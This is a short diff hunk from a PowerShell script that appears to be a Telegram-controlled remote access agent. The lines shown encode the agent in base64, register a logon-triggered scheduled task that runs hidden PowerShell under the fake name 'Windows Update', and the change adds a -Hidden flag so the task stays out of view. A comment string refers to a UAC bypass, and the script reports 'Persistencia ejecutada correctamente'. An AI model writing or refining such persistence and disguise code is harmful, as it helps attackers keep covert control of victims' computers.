@@ -190,7 +190,7 @@ If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 $agent_bot = create_agent -botkey $botkey -chat_id $chat_id;  $agent_bot = $agent_bot -replace "con bypassuac :D","" ; $code = code_a_base64 -code $agent_bot; 
 $accion = New-ScheduledTaskAction -Execute "C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -Argument "-win hidden -enc $code"
 $desencadenante = New-ScheduledTaskTrigger -AtLogOn
-$tarea = New-ScheduledTask -Action $accion -Trigger $desencadenante -Settings (New-ScheduledTaskSettingsSet)
+$tarea = New-ScheduledTask -Action $accion -Trigger $desencadenante -Settings (New-ScheduledTaskSettingsSet -Hidden)
 $tarea | Register-ScheduledTask -TaskName "Windows Update" | Out-Null; $texto = ""
 $texto = "Persistencia ejecutada correctamente"; return $texto;break}
 }
